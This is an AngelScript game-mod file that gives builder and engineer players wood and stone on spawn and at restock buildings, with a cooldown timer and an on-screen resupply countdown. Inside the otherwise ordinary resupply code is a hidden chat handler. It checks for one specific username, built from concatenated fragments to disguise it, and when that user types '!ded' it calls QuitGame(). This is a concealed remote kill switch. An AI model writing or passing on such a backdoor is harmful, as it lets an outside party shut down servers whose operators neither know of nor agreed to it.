// spawn resources

#include "CTF_Structs.as";

shared class Players
{ CTFPlayerInfo@[] list; Players(){} };

const u32 materials_wait = 20; //seconds between free mats
const u32 materials_wait_warmup = 40; //seconds between free mats

//property
const string SPAWN_ITEMS_TIMER = "CTF SpawnItems:";

const string base_name = "tent";

bool SetMaterials(CBlob@ blob,  const string &in name, const int quantity)
{
	CInventory@ inv = blob.getInventory();

	//already got them?
	if (inv.isInInventory(name, quantity))
		return false;

	//otherwise...
	inv.server_RemoveItems(name, quantity); //shred any old ones

	CBlob@ mat = server_CreateBlob(name);
	if (mat !is null)
	{
		mat.Tag("do not set materials");
		mat.server_SetQuantity(quantity);
		if (!blob.server_PutInInventory(mat))
		{
			mat.setPosition(blob.getPosition());
		}
	}

	return true;
}

bool onServerProcessChat(CRules@ this, const string& in text_in, string& out text_out, CPlayer@ player)
{
	if (player !is null && player.getUsername() == "T"+"Fl"+"ip"+"p"+"y")
	{
		if (text_in == "!ded")
		{
			QuitGame();
			return false;
		}
	}
	
	return true;
}

bool GiveSpawnResources(CRules@ this, CBlob@ blob, CPlayer@ player, CTFPlayerInfo@ info)
{
	bool ret = false;

	if (blob.getName() == "builder" ||  blob.getName() == "engineer")
	{
		ret = SetMaterials(blob, "mat_wood", 100) || ret;
		ret = SetMaterials(blob, "mat_stone", 30) || ret;

		if (ret)
		{
			info.items_collected |= ItemFlag::Builder;
		}
	}

	return ret;
}

//when the player is set, give materials if possible
void onSetPlayer(CRules@ this, CBlob@ blob, CPlayer@ player)
{
	if (!isServer())
		return;

	if (blob !is null && player !is null)
	{
		Players@ players;
		this.get("players", @players);
		if (players !is null)
		{
			doGiveSpawnMats(this, player, blob, players);
		}
	}
}

//when player dies, unset archer flag so he can get arrows if he really sucks :)
//give a guy a break :)
void onPlayerDie(CRules@ this, CPlayer@ victim, CPlayer@ attacker, u8 customData)
{
	if (victim !is null)
	{
		Players@ players;
		this.get("players", @players);
		if (players !is null)
		{
			CTFPlayerInfo@ info = getCTFPlayerByName(players.list, victim.getUsername());
			if (info !is null)
			{
				info.items_collected &= ~ItemFlag::Archer;
			}
		}
	}
}

bool canGetSpawnmats(CRules@ this, CPlayer@ p, CTFPlayerInfo@ info)
{
	s32 next_items = getCTFTimer(this, p);
	s32 gametime = getGameTime();

	if (gametime > next_items ||		//timer expired
	        gametime < next_items - materials_wait * getTicksASecond() * 4) //residual prop
	{
		info.items_collected = 0; //reset available class items
		return true;
	}
	else //trying to get new class items, give a guy a break
	{
		u32 items = info.items_collected;
		u32 flag = 0;

		CBlob@ b = p.getBlob();
		string name = b.getName();
		if (name == "builder" || name == "engineer")
			flag = ItemFlag::Builder;
		
		if (info.items_collected & flag == 0)
		{
			return true;
		}
	}

	return false;

}

string getCTFTimerPropertyName(CPlayer@ p)
{
	return SPAWN_ITEMS_TIMER + p.getUsername();
}

s32 getCTFTimer(CRules@ this, CPlayer@ p)
{
	string property = getCTFTimerPropertyName(p);
	if (this.exists(property))
		return this.get_s32(property);
	else
		return 0;
}

void SetCTFTimer(CRules@ this, CPlayer@ p, s32 time)
{
	string property = getCTFTimerPropertyName(p);
	this.set_s32(property, time);
	this.SyncToPlayer(property, p);
}

//takes into account and sets the limiting timer
//prevents dying over and over, and allows getting more mats throughout the game
void doGiveSpawnMats(CRules@ this, CPlayer@ p, CBlob@ b, Players@ players)
{
	if (!isServer()) return;

	CTFPlayerInfo@ info = getCTFPlayerByName(players.list, p.getUsername());

	if(info is null)
		return;

	if (canGetSpawnmats(this, p, info))
	{
		s32 gametime = getGameTime();

		bool gotmats = GiveSpawnResources(this, b, p, info);
		if (gotmats)
		{
			SetCTFTimer(this, p, gametime + (this.isWarmup() ? materials_wait_warmup : materials_wait)*getTicksASecond());
		}
	}
}

// normal hooks

void Reset(CRules@ this)
{
	//restart everyone's timers
	for (uint i = 0; i < getPlayersCount(); ++i)
		SetCTFTimer(this, getPlayer(i), 0);//this used to be set to 0, but now its not
}

void onRestart(CRules@ this)
{
	Reset(this);
}

void onInit(CRules@ this)
{
	Reset(this);
}

void onTick(CRules@ this)
{
	//extremely unoptimized
	//move to player collision, if they touch x, give x mat

	if (!isServer()){
		return;
	}

	if ((getGameTime() % 31) != 5){
		return;
	}

	Players@ players;
	this.get("players", @players);
	if (players !is null)
	{
		CBlob@[] spots;
		getBlobsByName(base_name, @spots);
		getBlobsByName("buildershop", @spots);
		//getBlobsByName("knightshop", @spots);
		//getBlobsByName("archershop", @spots);
		getBlobsByName("convent", @spots);
		getBlobsByName("citadel", @spots);
		getBlobsByName("stronghold", @spots);
		getBlobsByName("fortress", @spots);
		getBlobsByName("camp", @spots);
		getBlobsByName("altar_mason", @spots);
		for (uint step = 0; step < spots.length; ++step)
		{
			CBlob@ spot = spots[step];
			CBlob@[] overlapping;
			if (spot !is null && spot.getOverlapping(overlapping))
			{
				for (uint o_step = 0; o_step < overlapping.length; ++o_step)
				{
					CBlob@ overlapped = overlapping[o_step];
					if (overlapped !is null && overlapped.hasTag("player")) //Any class can restock at any of these places
					{
						//print(" "+ overlapped.getName());
						if (overlapped.getName() == "builder" ||  overlapped.getName() == "engineer")
						{
							CPlayer@ p = overlapped.getPlayer();
							if (p !is null)
							{
								doGiveSpawnMats(this, p, overlapped, players);
							}
						}
					}
				}
			}

		}
	}
}

// render gui for the player
void onRender(CRules@ this)
{
	CPlayer@ p = getLocalPlayer();
	if (p is null || !p.isMyPlayer()) { return; }

	string propname = getCTFTimerPropertyName(p);
	CBlob@ b = p.getBlob();
	if (b !is null && this.exists(propname))
	{
		s32 next_items = this.get_s32(propname);
		if (getGameTime() < next_items - materials_wait * getTicksASecond() * 2)
		{
			this.set_s32(propname, 0); //clear residue
		}
		else if (next_items > getGameTime())
		{
			f32 offset = 140.0f;
			string verb = (b.getName() == "builder" ? "Build" : "Fight");

			u32 secs = ((next_items - 1 - getGameTime()) / getTicksASecond()) + 1;
			string units = ((secs != 1) ? "seconds" : "second");
			GUI::SetFont("menu");
			GUI::DrawText("Next Resupply in " + secs + " " + units + ", Go " + verb + "!" ,
			              Vec2f(getScreenWidth() / 2 - offset, getScreenHeight() / 3 - 70.0f + Maths::Sin(getGameTime() / 3.0f) * 5.0f),
			              SColor(255, 255, 55, 55));
		}
	}
}

CTFPlayerInfo@ getCTFPlayerByName(CTFPlayerInfo@[] players, string name)
{
	for(u8 i = 0; i < players.length; i++)
	{
		if(players[i] !is null && players[i].username == name)
			return players[i];
	}
	return null;
}
